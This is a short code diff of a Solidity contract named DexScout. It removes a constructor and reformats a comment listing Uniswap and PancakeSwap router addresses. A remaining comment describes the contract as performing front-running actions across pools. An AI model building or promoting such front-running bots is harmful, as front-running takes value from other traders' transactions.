@@ -26,19 +26,14 @@ contract DexScout {
 
     event Log(string _msg);
 
-    constructor(string memory Network, string memory routerAddress) {
-            /*
-        @@ ETH
-        ## The Uniswap V2 router address :  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
+        /*
+    @@ ETH
+    ## The Uniswap V2 router address :  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
 
-        @BSC
-        ## Pancakeswap router address :     0x10ED43C718714eb63d5aA57B78B54704E256024E
-        && Network: ETH or BSC
-          */
-
-        _Network = Network;
-        _RouterAddress = routerAddress;
-    }
+    @BSC
+    ## Pancakeswap router address :     0x10ED43C718714eb63d5aA57B78B54704E256024E
+    && Network: ETH or BSC
+      */
 
     receive() external payable {}
 
@@ -46,7 +41,6 @@ contract DexScout {
         uint256 _len;
         uint256 _ptr;
     }
-
 
         /*
     @@ dev Perform frontrun action from different contract pools
